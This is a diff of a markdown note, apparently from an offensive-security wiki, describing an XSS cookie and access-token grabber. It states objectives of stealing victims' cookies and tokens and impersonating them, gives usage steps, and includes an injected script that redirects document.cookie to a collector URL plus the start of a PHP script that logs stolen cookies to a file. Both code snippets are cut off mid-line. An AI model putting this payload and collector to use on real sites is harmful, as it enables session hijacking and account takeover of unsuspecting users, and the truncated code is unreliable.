@@ -34,11 +34,15 @@ Technical Explanation: The tool works by injecting malicious code into a vulnera
 
 Business Value: The XSS Cookie and Access Token Grabber can be used by attackers to gain unauthorized access to sensitive information, which can be used for financial gain or to gain a competitive advantage over a target organization.
 
+ 
+
 ## Requirements
 
 1. Access to a vulnerable web application
 
 1. Ability to inject malicious code into the web application
+
+ 
 
 ## Defense
 
@@ -48,25 +52,41 @@ Business Value: The XSS Cookie and Access Token Grabber can be used by attackers
 
 1. Implement multi-factor authentication to prevent unauthorized access
 
+ 
+
 ## Objectives
 
 1. Steal cookies and access tokens from a victim's browser
 
 1. Impersonate the victim and gain unauthorized access to their account
 
+ 
+
 # Instructions
 
 1. To use this command, you need to inject the code into a website that is vulnerable to XSS attacks. Once injected, the code will grab the user's cookie and access token and send it to the specified URLs. Be careful not to use this code for malicious purposes.
 
+ 
+
+
+
 **Code**: [[<script>document.location='http://localhost/XSS/gr]]
+
+
 
 > The code in the 'data' field contains multiple commands that are executed when the injected code is executed on a vulnerable website. The first two commands grab the user's cookie and access token and send it to the specified URLs using 'document.location'. The second two commands do the same thing, but use 'new Image().src' instead. The 'lang' field specifies that the code is written in HTML. The 'text' field provides a brief explanation of what XSS is and what it can be used for. The 'instruction' field provides detailed instructions on how to use the code. The 'explain' field provides a more detailed explanation of what the code does and how it works.
 
 2. Use this command to write the collected cookie data into a file. The command will take the cookie data as input and append it to a file named 'cookies.txt'.
 
+ 
+
+
+
 **Code**: [[<?php
 $cookie = $_GET['c'];
 $fp = fopen('cookies.t]]
+
+
 
 > This command takes a single argument 'c' which is the cookie data to be written to the file. The command first opens the file 'cookies.txt' in append mode and then writes the cookie data to the file along with a label 'Cookie:' to identify the data. Finally, the file is closed.
 
@@ -87,3 +107,5 @@ $fp = fopen('cookies.t]]
 - [[Cross Site Scripting]]
 - [[Data grabber for XSS]]
 - [[Exploit code or POC]]
+
+
